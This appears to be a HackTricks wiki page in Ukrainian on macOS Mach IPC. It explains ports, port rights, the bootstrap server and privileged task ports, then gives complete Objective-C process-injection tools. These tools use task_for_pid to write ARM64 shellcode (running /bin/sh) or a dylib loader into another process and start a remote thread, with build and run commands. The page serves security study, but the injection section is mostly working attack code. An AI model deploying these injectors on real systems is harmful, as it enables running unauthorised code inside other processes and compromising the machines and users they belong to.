# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach використовує **tasks** як **найменшу одиницю** для обміну ресурсами, і кожен task може містити **кілька потоків**. Ці **tasks і threads відображаються 1:1 на POSIX процеси і потоки**.

Комунікація між tasks відбувається через Mach Inter-Process Communication (IPC), використовуючи односторонні канали зв'язку. **Повідомлення передаються між портами**, які діють як **черги повідомлень**, що управляються ядром.

Кожен процес має **IPC таблицю**, в якій можна знайти **mach порти процесу**. Ім'я mach порту насправді є числом (вказівником на об'єкт ядра).

Процес також може надіслати ім'я порту з певними правами **іншому task** і ядро зробить цей запис у **IPC таблиці іншого task** видимим.

### Port Rights

Права порту, які визначають, які операції може виконувати task, є ключовими для цієї комунікації. Можливі **права порту** ([визначення звідси](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Receive right**, що дозволяє отримувати повідомлення, надіслані на порт. Mach порти є MPSC (multiple-producer, single-consumer) чергами, що означає, що може бути лише **одне право отримання для кожного порту** в усій системі (на відміну від труб, де кілька процесів можуть утримувати дескриптори файлів для читання з однієї труби).
- **Task з Receive** правом може отримувати повідомлення і **створювати Send права**, що дозволяє йому надсилати повідомлення. Спочатку лише **власний task має Receive право на свій порт**.
- **Send right**, що дозволяє надсилати повідомлення на порт.
- Send право може бути **клоновано**, тому task, що володіє Send правом, може клонувати право і **надати його третьому task**.
- **Send-once right**, що дозволяє надіслати одне повідомлення на порт і потім зникати.
- **Port set right**, що позначає _набір портів_, а не один порт. Витягування повідомлення з набору портів витягує повідомлення з одного з портів, які він містить. Набори портів можуть використовуватися для прослуховування кількох портів одночасно, подібно до `select`/`poll`/`epoll`/`kqueue` в Unix.
- **Dead name**, що не є фактичним правом порту, а лише заповнювачем. Коли порт знищується, всі існуючі права порту на порт перетворюються на мертві імена.

**Tasks можуть передавати SEND права іншим**, дозволяючи їм надсилати повідомлення назад. **SEND права також можуть бути клоновані, тому task може дублювати і надавати право третьому task**. Це, в поєднанні з проміжним процесом, відомим як **bootstrap server**, дозволяє ефективну комунікацію між tasks.

### File Ports

File ports дозволяють інкапсулювати дескриптори файлів у Mac портах (використовуючи права Mach порту). Можна створити `fileport` з даного FD, використовуючи `fileport_makeport`, і створити FD з fileport, використовуючи `fileport_makefd`.

### Establishing a communication

#### Steps:

Як згадувалося, для встановлення каналу зв'язку залучено **bootstrap server** (**launchd** в mac).

1. Task **A** ініціює **новий порт**, отримуючи **RECEIVE право** в процесі.
2. Task **A**, будучи власником RECEIVE права, **генерує SEND право для порту**.
3. Task **A** встановлює **з'єднання** з **bootstrap server**, надаючи **ім'я служби порту** та **SEND право** через процедуру, відому як реєстрація bootstrap.
4. Task **B** взаємодіє з **bootstrap server**, щоб виконати bootstrap **пошук для імені служби**. Якщо успішно, **сервер дублює SEND право**, отримане від Task A, і **передає його Task B**.
5. Отримавши SEND право, Task **B** здатний **сформулювати** **повідомлення** і надіслати його **Task A**.
6. Для двосторонньої комунікації зазвичай task **B** генерує новий порт з **RECEIVE** правом і **SEND** правом, і надає **SEND право Task A**, щоб він міг надсилати повідомлення TASK B (двостороння комунікація).

Bootstrap server **не може аутентифікувати** ім'я служби, яке заявляє task. Це означає, що **task** може потенційно **вдаватись під будь-який системний task**, наприклад, неправильно **заявляючи ім'я служби авторизації** і потім схвалюючи кожен запит.

Тоді Apple зберігає **імена служб, наданих системою**, у захищених конфігураційних файлах, розташованих у **SIP-захищених** каталогах: `/System/Library/LaunchDaemons` та `/System/Library/LaunchAgents`. Поряд з кожним ім'ям служби, **також зберігається асоційований бінарний файл**. Bootstrap server створить і утримає **RECEIVE право для кожного з цих імен служб**.

Для цих попередньо визначених служб **процес пошуку трохи відрізняється**. Коли ім'я служби шукається, launchd динамічно запускає службу. Новий робочий процес виглядає так:

- Task **B** ініціює bootstrap **пошук** для імені служби.
- **launchd** перевіряє, чи працює task, і якщо ні, **запускає** його.
- Task **A** (служба) виконує **bootstrap check-in**. Тут **bootstrap** сервер створює SEND право, утримує його і **передає RECEIVE право Task A**.
- launchd дублює **SEND право і надсилає його Task B**.
- Task **B** генерує новий порт з **RECEIVE** правом і **SEND** правом, і надає **SEND право Task A** (службі), щоб вона могла надсилати повідомлення TASK B (двостороння комунікація).

Однак цей процес застосовується лише до попередньо визначених системних tasks. Несистемні tasks все ще працюють, як описано спочатку, що може потенційно дозволити вдавання.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Функція `mach_msg`, по суті, є системним викликом, що використовується для надсилання та отримання Mach повідомлень. Функція вимагає, щоб повідомлення, що надсилається, було першим аргументом. Це повідомлення повинно починатися з структури `mach_msg_header_t`, за якою слідує фактичний вміст повідомлення. Структура визначається наступним чином:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Процеси, що мають _**право отримання**_, можуть отримувати повідомлення на Mach порту. Навпаки, **відправникам** надається _**право відправлення**_ або _**право відправлення один раз**_. Право відправлення один раз призначене виключно для відправлення одного повідомлення, після чого воно стає недійсним.

Щоб досягти простого **двостороннього зв'язку**, процес може вказати **mach порт** у заголовку **повідомлення mach**, який називається _портом відповіді_ (**`msgh_local_port`**), куди **отримувач** повідомлення може **надіслати відповідь** на це повідомлення. Бітові прапорці в **`msgh_bits`** можуть бути використані для **вказівки**, що **право відправлення один раз** повинно бути отримано та передано для цього порту (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

> [!TIP]
> Зверніть увагу, що цей вид двостороннього зв'язку використовується в XPC повідомленнях, які очікують відповідь (`xpc_connection_send_message_with_reply` та `xpc_connection_send_message_with_reply_sync`). Але **зазвичай створюються різні порти**, як було пояснено раніше, для створення двостороннього зв'язку.

Інші поля заголовка повідомлення:

- `msgh_size`: розмір всього пакета.
- `msgh_remote_port`: порт, на який надсилається це повідомлення.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID цього повідомлення, який інтерпретується отримувачем.

> [!CAUTION]
> Зверніть увагу, що **mach повідомлення надсилаються через \_mach порт**\_, який є **каналом зв'язку з одним отримувачем** та **багатьма відправниками**, вбудованим у ядро mach. **Кілька процесів** можуть **надсилати повідомлення** на mach порт, але в будь-який момент лише **один процес може читати** з нього.

### Перерахувати порти
```bash
lsmp -p <pid>
```
Ви можете встановити цей інструмент на iOS, завантаживши його з [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Приклад коду

Зверніть увагу, як **відправник** **виділяє** порт, створює **право на відправку** для імені `org.darlinghq.example` і надсилає його на **bootstrap server**, в той час як відправник запитує **право на відправку** цього імені і використовує його для **надсилання повідомлення**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

### Привілейовані порти

- **Хост-порт**: Якщо процес має **Send** привілей над цим портом, він може отримати **інформацію** про **систему** (наприклад, `host_processor_info`).
- **Хост-привілейований порт**: Процес з правом **Send** над цим портом може виконувати **привілейовані дії**, такі як завантаження розширення ядра. **Процес повинен бути root**, щоб отримати цей дозвіл.
- Більше того, для виклику **`kext_request`** API потрібно мати інші права **`com.apple.private.kext*`**, які надаються лише бінарним файлам Apple.
- **Порт імені завдання:** Непривілейована версія _порт завдання_. Він посилається на завдання, але не дозволяє його контролювати. Єдине, що, здається, доступно через нього, це `task_info()`.
- **Порт завдання** (також відомий як порт ядра): З правом Send над цим портом можливо контролювати завдання (читати/писати пам'ять, створювати потоки...).
- Викличте `mach_task_self()`, щоб **отримати ім'я** для цього порту для викликаного завдання. Цей порт лише **успадковується** через **`exec()`**; нове завдання, створене за допомогою `fork()`, отримує новий порт завдання (як особливий випадок, завдання також отримує новий порт завдання після `exec()` в suid бінарі). Єдиний спосіб створити завдання та отримати його порт - це виконати ["танець обміну портами"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) під час виконання `fork()`.
- Це обмеження для доступу до порту (з `macos_task_policy` з бінарного файлу `AppleMobileFileIntegrity`):
- Якщо додаток має **`com.apple.security.get-task-allow` entitlement**, процеси з **того ж користувача можуть отримати доступ до порту завдання** (зазвичай додається Xcode для налагодження). Процес **нотаризації** не дозволить цього для виробничих релізів.
- Додатки з правом **`com.apple.system-task-ports`** можуть отримати **порт завдання для будь-якого** процесу, за винятком ядра. У старіших версіях це називалося **`task_for_pid-allow`**. Це надається лише додаткам Apple.
- **Root може отримати доступ до портів завдань** додатків, які **не** скомпільовані з **захищеним** середовищем виконання (і не від Apple).

### Впровадження Shellcode в потік через порт завдання

Ви можете отримати shellcode з:

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Скомпілюйте** попередню програму та додайте **entitlements**, щоб мати можливість інжектувати код з тим самим користувачем (якщо ні, вам потрібно буде використовувати **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Впровадження Dylib у потік через порт завдання

У macOS **потоки** можуть бути маніпульовані через **Mach** або за допомогою **posix `pthread` api**. Потік, який ми створили в попередньому впровадженні, був створений за допомогою Mach api, тому **він не відповідає стандартам posix**.

Було можливим **впровадити простий shellcode** для виконання команди, оскільки він **не потребував роботи з posix** сумісними api, лише з Mach. **Більш складні впровадження** вимагатимуть, щоб **потік** також був **сумісний з posix**.

Отже, щоб **покращити потік**, він повинен викликати **`pthread_create_from_mach_thread`**, що створить **дійсний pthread**. Потім цей новий pthread може **викликати dlopen**, щоб **завантажити dylib** з системи, тому замість написання нового shellcode для виконання різних дій можна завантажити власні бібліотеки.

Ви можете знайти **приклади dylibs** у (наприклад, той, що генерує журнал, а потім ви можете його прослухати):

{{#ref}}
../../macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Перехоплення потоку через порт завдання <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

У цій техніці перехоплюється потік процесу:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md
{{#endref}}

## XPC

### Основна інформація

XPC, що означає XNU (ядро, яке використовується в macOS), є фреймворком для **зв'язку між процесами** на macOS та iOS. XPC надає механізм для виконання **безпечних, асинхронних викликів методів між різними процесами** в системі. Це частина парадигми безпеки Apple, що дозволяє **створювати програми з розділеними привілеями**, де кожен **компонент** працює з **тільки тими правами, які йому потрібні** для виконання своєї роботи, тим самим обмежуючи потенційні збитки від скомпрометованого процесу.

Для отримання додаткової інформації про те, як цей **зв'язок працює** і як він **може бути вразливим**, перегляньте:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/
{{#endref}}

## MIG - Генератор інтерфейсу Mach

MIG був створений для **спрощення процесу створення коду Mach IPC**. Він в основному **генерує необхідний код** для зв'язку сервера та клієнта з даним визначенням. Навіть якщо згенерований код виглядає неохайно, розробнику просто потрібно його імпортувати, і його код стане набагато простішим, ніж раніше.

Для отримання додаткової інформації перегляньте:

{{#ref}}
../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md
{{#endref}}

## Посилання

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
